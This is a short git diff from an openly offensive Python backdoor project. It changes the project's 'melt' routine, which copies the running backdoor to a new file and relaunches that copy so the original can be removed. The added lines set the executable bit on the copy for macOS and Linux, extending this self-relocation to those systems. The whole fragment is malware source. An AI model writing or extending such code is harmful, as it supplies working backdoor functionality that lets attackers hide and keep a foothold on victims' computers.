@@ -7,9 +7,12 @@ https://github.com/xp4xbox/Python-Backdoor
 import abc
 import os
 import shutil
+import stat
 import subprocess
 import sys
 import tempfile
+
+from src.definitions import platforms
 
 
 def melt():
@@ -33,6 +36,10 @@ def melt():
             shutil.copyfile(curr_file, new_file)
         except IOError:
             return
+
+        if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
+            st = os.stat(new_file)
+            os.chmod(new_file, st.st_mode | stat.S_IEXEC)
 
         subprocess.Popen([new_file, "-r", curr_file])
         sys.exit(0)
